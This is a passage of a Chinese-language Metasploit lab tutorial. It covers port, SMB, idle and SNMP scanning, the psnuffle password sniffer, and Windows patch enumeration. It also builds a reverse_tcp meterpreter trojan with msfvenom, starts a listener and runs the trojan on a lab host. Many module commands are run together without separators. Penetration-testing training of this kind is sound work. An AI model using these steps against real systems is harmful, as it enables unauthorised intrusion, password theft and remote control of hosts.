1、端口扫描

默认情况下，所有扫描模块的“ THREADS”值都设置为“ 1”。“ THREADS”值设置扫描时要使用的并发线程数。将此值设置为较高的值可以加快扫描速度，或将其降低以减少网络流量，但是请务必遵循以下准则：

    • ✅在本地Win32系统上，将THREADS值保持在16以下

    • ✅在Cygwin下运行MSF时，将线程数保持在200以下

    • ✅在类似Unix的操作系统上，THREADS可以设置为256

1.1 Nmap与DB_Nmap

我们可以使用db_nmap命令对目标运行Nmap，然后扫描结果将自动存储在数据库中。但是，如果以后还希望将扫描结果导入到另一个应用程序或框架中，则可能要以XML格式导出扫描结果。具有所有三个Nmap输出（xml，grepable和normal）总是很不错的。因此，我们可以使用-oA标志以及所需的文件名运行Nmap扫描，以生成三个输出文件，然后发出db_import命令以填充Metasploit数据库。

db_nmap -v -sV 192.168.207.0/24

1.2 端口扫描

除了运行Nmap之外，框架内还有许多其他端口扫描程序可供我们使用。

search portscan

为了进行比较，我们将端口80的Nmap扫描结果与Metasploit扫描模块进行比较。首先，让我们确定根据Nmap打开80端口的主机。

我们之前运行的Nmap扫描是SYN扫描，因此我们将在整个子网中运行相同的扫描，并使用Metasploit通过eth0接口查找端口80。

use auxiliary/scanner/portscan/synset interface eth0set ports 80set rhosts 192.168.207.0/24set threads 50run

在这里，我们将加载"tcp"扫描，并将其用于其他目标。与前面提到的所有插件一样，它使用“ RHOSTS”选项。请记住，我们可以发出hosts -R命令以使用数据库中的主机自动设置此选项。

use auxiliary/scanner/portscan/tcphosts -Rrun

我们可以看到，Metasploit的内置扫描仪模块不但能够为我们找到系统和开放端口。如果您碰巧在未安装Nmap的系统上运行Metasploit，则这只是您的工具库中的另一个出色工具。

2、SMB版本扫描

现在我们已经确定了网络上可用的主机，我们可以尝试确定它们正在运行的操作系统。这将有助于我们缩小针对特定系统的攻击范围，并避免我们将时间浪费在那些不容易受到特定漏洞利用的攻击上。

use auxiliary/scanner/smb/smb_versionset RHOSTS 192.168.207.139set THREADS 11run

3、IDLE扫描

Nmap的IPID空闲扫描使我们可以隐蔽地扫描目标，同时欺骗网络上另一台主机的IP地址。为了使这种类型的扫描有效，我们需要找到一个主机，该主机在网络上处于空闲状态，并使用增量或中断的Little-Endian增量的IPID序列。Metasploit包含模块scanner / ip / ipidseq，以进行扫描并查找符合要求的主机。

use auxiliary/scanner/ip/ipidseqset RHOSTS 192.168.207.0/24set THREADS 50run

从扫描结果来看，我们有许多潜在的僵尸可用于执行空闲扫描。我们将尝试使用位于192.168.207.2的僵尸扫描主机，以查看是否获得与之前相同的结果。

nmap -Pn -sI 192.168.207.2 192.168.207.139

6、密码嗅探

Metasploit密码嗅探模块psnuffle，类似于工具dsniff一样从网络上嗅探密码。目前支持POP3，IMAP，FTP和HTTP GET。

use auxiliary/sniffer/psnuffleshow options

同时支持pacp导入功能

执行run以后会进入到后台运行

使用jobs -i 任务ID进入查看

7、SNMP扫描

metasploittable2默认只允许本地连接，需要配置远程访问

sudo sed -i 's/127.0.0.1/0.0.0.0/' /etc/default/snmpdsudo /etc/init.d/snmpd restart

7.1 SNMP扫描

use auxiliary/scanner/snmp/snmp_loginset rhosts 192.168.127.133run

7.2 SNMP枚举

use auxiliary/scanner/snmp/snmp_enumset rhosts 192.168.127.133set threads 10run

8、Windows系统枚举

use post/windows/gather/enum_patchesshow options

高级选项

show advanced
一旦使用Windows目标启动了一个meterpreter会话，加载enum_patches模块并设置“ SESSION”选项后，使用run命令将针对我们的目标启动该模块。

8.1 生成Windows木马

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.127.128 lport=4444 -f exe > /root/shell.exe

8.2 开启监听

use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.127.128set lport 4444run

8.3 在服务器打开shell.exe

已经生成一个meterpreter的session 1

8.4 使用enum_patches

use post/windows/gather/enum_patchesset session 1
